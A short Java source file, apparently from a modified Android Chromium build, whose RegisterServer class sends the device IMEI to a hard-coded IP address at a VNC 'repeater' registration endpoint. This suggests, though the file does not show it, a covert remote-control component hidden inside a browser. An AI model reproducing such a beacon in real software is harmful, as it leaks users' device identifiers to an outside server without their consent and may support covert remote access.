package org.chromium.chrome.browser.vnc.reg;

import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

import static java.net.Proxy.Type.HTTP;

/**
 * Created by Administrator on 2017/7/10.
 */

public class RegisterServer {

    private static String url = "http://118.89.48.252:8080/repeater/control/RepeaterRegEvents";

    private static String imei;
    private static String uniqueId;
    public static String target = null;

    private RegisterServer() {
    }
    private static void init(){
        imei = null;
        uniqueId = null;
        target = null;
    }
    public static boolean reg(String imei) {
        String str = null;
        init();
        Map<String,String> map = new HashMap<String,String>();
        map.put("imei", imei);
        map.put("uniqueId", "123456");
        try {
            str = HttpClientUtils.post(new StringBuilder(url).toString(), map);
        } catch (Exception e) {
            e.printStackTrace();
            return Boolean.FALSE;
        }
        if (StringUtil.isBlank(str)) {
            return Boolean.FALSE;
        }
        WebResult result = JsonUtils.TO_OBJ(str, WebResult.class);
        if (!result.isStatus()) {
            return Boolean.FALSE;
        }
        Constants.REG_INFO = JsonUtils.TO_OBJ(result.getResult(), RegistResponse.class);
        return Boolean.TRUE;
    }

}
